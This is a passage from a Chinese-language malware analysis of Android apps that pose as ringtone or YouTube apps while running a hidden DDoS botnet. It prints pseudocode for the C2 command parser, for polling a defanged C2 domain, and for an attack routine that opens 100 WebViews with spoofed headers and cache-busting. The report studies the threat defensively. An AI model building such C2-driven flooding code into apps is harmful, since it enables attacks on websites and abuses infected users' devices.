      https://A_TARGETED_WEBSITE/snewxwriA_USER_AGENT_STRINGsnewxwrihttps://A_REFER_HEADER_VALUE/
从 ****标签中提取出来的值作为参数传入到 **String- >contains()**，确保这个值包含token分隔字符串"
**snewxwri** "。如果分隔符存在，就把内容trim一下，然后用split()分隔成包含几个部分的 **Array**
。最后得到的分隔后的值将作为参数传入到 **DDoS_Service- >attack()**方法中。
**C2服务器端响应解析之后的伪代码**
    Class AttackCommandParser extends WebViewClient {  
        Public function onPageFinished(C2_WebView,C2_url) {
            String pageTitle = C2_WebView->getTitle();
            if (pageTitle->contains(“snewxwri”) == true) {
                pageTitle = pageTitle->trim();
                Array commandParts = pageTitle.split(“snewxwri”);
                String target = commandParts[0];
                String userAgent = commandParts[1];
                String referer = commandParts[2];
                DDoS_Service->attack(target, userAgent, referer);
            }
        }
    }
**DDoS Service**
DDoS_Service组件就是用来发动攻击的核心组件了。它包含三个核心函数。它们的任务分别是：运行 **Service** 、调用
**poll_c2()** 方法加载C2的 **WebView** ，以及最重要的——发起攻击。我们先上伪代码，然后对这三个函数逐一进行分析。
**DDoS Service伪代码**
    Class DDoS_Service extends Object {  
        Public function onCreate() {
            Handler OS_Handler = new Handler();
            Object Runner = new ServiceRunner();
            OS_Handler->postDelayed(Runner,2);
        }
        Public function poll_c2() {
            WebViewClient C2_Parser = new AttackCommandParser();
            WebView C2_WebView = new WebView();
            WebViewSettings C2_WebView_Settings = C2_WebView->getSettings();
            C2_WebView_Settings->setCacheMode(LOAD_NO_CACHE);
            C2_WebView->clearCache(true);
            C2_WebView->clearHistory();
            C2_WebView->setWebViewClient(C2_Parser);
            C2_WebView->loadUrl(“http://g[.]axclick[.]store”);
        }
        Public function attack(String target, String userAgent, String referer) {
            HashMap WebViewHeaders = new HashMap();
            WebViewHeaders->put(“Referer”,referer);
            WebViewHeaders->put(“X-Requested-With”,””);
            WebView[] AttackerViews = new WebView[100];
            for (int i=0; iclearHistory();
                AttackerViews[i]->clearFormData();
                AttackerViews[i]->clearCache(true);
                WebViewSettings AttackWebViewSettings = AttackerViews[i]->getSettings();
                AttackWebViewSettings->setJavaScriptEnabled(true);
                AttackWebViewSettings->setUserAgentString(userAgent);
                AttackWebViewSettings->setCacheMode(LOAD_NO_CACHE);
                this->deleteDatabase(“webview.db”);
                this->deleteDatabase(“webviewCache.db”);
                AttackerViews[i]->loadUrl(target,WebViewHeaders);
            }
        }
    }
**DDoS Service的onCreate()**
onCreate()方法直截了当：就创建了一个新的 **android.os.Handler** 以及 **ServiceRunner** 实例。其中
**ServiceRunner** 实例随后通过 **postDelayed()**
方法被hook到Handler上。根据[Android官方文档](https://developer.android.com/reference/android/os/Handler.html#postDelayed\(java.lang.Runnable,%20long\))的介绍，这"使得Runnable对象被添加到消息队列中，然后经过一段特定的时间之后被调用"。这个方法接收的第二个参数是在Runnable被调用之前需要经过的毫秒(ms)数。在这个例子里面就是2，也就是2ms，可见攻击者多么具有攻击性。
**DDoS Service poll_c2()**
poll_c2()方法负责使用C2 URL不断重新加载WebView，同时将AttackCommandParser WebViewClient
hook到轮询器WebView实例中。 在轮询C2域之前，这个Service将清除并禁用缓存，并清除WebView实例的历史记录。
执行这些步骤是为了确保客户端始终从C2获取最新信息，而不是从本地设备的缓存中。 在分析attack()方法时，我们会看到这种策略再次被使用。
**DDoS Service attack()**
    Public function attack(String target, String userAgent, String referer) {  
        HashMap WebViewHeaders = new HashMap();
        WebViewHeaders->put(“Referer”,referer);
        WebViewHeaders->put(“X-Requested-With”,””);    
        WebView[] AttackerViews = new WebView[100];
        for (int i=0; iclearHistory();
            AttackerViews[i]->clearFormData();
            AttackerViews[i]->clearCache(true);
            WebViewSettings AttackWebViewSettings = AttackerViews[i]->getSettings();
            AttackWebViewSettings->setJavaScriptEnabled(true);
            AttackWebViewSettings->setUserAgentString(userAgent);
            AttackWebViewSettings->setCacheMode(LOAD_NO_CACHE);
            this->deleteDatabase(“webview.db”);
            this->deleteDatabase(“webviewCache.db”);
            AttackerViews[i]->loadUrl(target,WebViewHeaders);
        }
    }
**attack()** 方法负责生成实际的攻击流量。之前讨论的 **AttackCommandParser- > onPageFinished()
**将传递由最后一个C2交互发出的target，userAgent和referer值。此方法将创建一个 **HashMap**
对象，该对象将配置攻击期间使用的HTTP头。
第一个头是HTTP Referer，据我们所知这是由C2服务器提供的。在所有我们观察到的情况中，该值是实际目标的镜像值。第二个头是
**X-Requested-With** ; 虽然 **WebView**
通常会有一个默认值，但它将被空白值覆盖。通常来自嵌入式WebView的这个HTTP头将包含与Android应用程序有关的信息，例如
**com.[app_author].app** 。这个头部很可能被专门用来混淆攻击目标身上遇到的攻击流量是谁或者什么。
一旦配置了headers，就会实例化一个空的 **WebView** 占位符数组，然后是一个循环，用实际的 **WebView**
实例来填充这个数组。每个实例都通过同一组配置过程。创建的WebView实例将具有其历史记录，保存的表单数据和缓存清除。启用JavaScript功能（默认情况下嵌入式WebViews通常被禁用），将使用C2攻击指令提供的值覆盖HTTP头中出现的
**User-Agent** 字符串，并将 **CacheMode** 设置为 **LOAD_NO_CACH**
E，这将强制浏览器实例绕过本地缓存，然后为每个请求获取目标URL。
最终确保设备上不会命中缓存，然后将该请求发送到目标，应用程序在加载每个请求之前也会从设备中删除其本地的 **webview.db** 和
**webviewCache.db** 文件。
最后，我们看到使用目标URL和自定义的WebViewHeaders HashMap在新配置的WebView实例上调用了 **loadUrl()** 方法。
**运行恶意软件——用户体验怎么样？**  
虽然许多已识别的应用程序已从Google Play商店中删除，但镜像仍然在互联网上，我们可以从那里下载APK文件。 我们将“ **twdlphqg**
”（其中一个攻击应用）加载到从2015年开始运行Android 5.0和安全补丁的三星Galaxy S4的设备上。
这个app与我们测试的其他app一样，使用的都是无害化的名称，如“设备分析工具”，“数据存储工具”“软件包管理器”等。
当应用程序运行时，它好像就是一个非常简单的铃声应用程序，只提供了三个铃声。 该应用程序可以播放和设置铃声，但没有其他功能。
然而在后台，这个应用程序产生了额外的进程，手机即使在锁屏的情况下，这些进程也会继续运行。 这个特性允许应用程序在后台从手机端发起DDoS攻击。
当我们将手机放在充电器上让它睡眠时，它就会继续发起DDoS攻击。
值得注意的是，现在已经无法安装这个应用程序了，因为Google的 **PlayProtect** 功能现在已经阻止这个应用程序安装了。
Google也将其从已经安装的设备中删除。 我们测试的本次攻击事件中所有这些应用程序都弹出了下面的禁用对话框，
而禁用PlayProtect是运行恶意软件所必需的。
**注意！注意！恶意app的变种！**  
我们测试了此次攻击事件中的多个应用，它们在恶意行为和用户界面方面都有不同的变化，但他们也并不全是铃声应用。 另外所有测试都是在同一台手机上进行的。
来自DDoS统计数据的 **Xryufrix**
是最受欢迎的，但是在运行时，它的表现是惊人的。可能是由于兼容性的问题，妨碍了它达到其完整的DDoS攻击力。该应用程序在初次安装时仅需要较少的权限，但是要求与
**twdlphqg**
具有相同的锁屏相关设备管理员权限。这个恶意软件想伪装成一个YouTube应用程序。当它首次打开时，它会向axclick域查询DDoS攻击命令以及针对
    p[.]axclick[.]store/?utm_source=tfikztteuic
的GET请求，它返回位于
    market://details?id=com[.]luckybooster[.]app
的app的Play Store
URL。当用户尝试播放Youtube视频时，此应用关闭，从应用列表中删除其图标，并且使它自己以后都无法执行，可能已经crash了。它还为“
**Luckybooster** ”应用程序打开了Play store的下载链接，它在运行时没有DDoS。 **xryufrix**
应用程序在手机睡眠时不会启动DDoS攻击，在应用程序处于活动状态的任何一个时刻也不会启动DDoS攻击。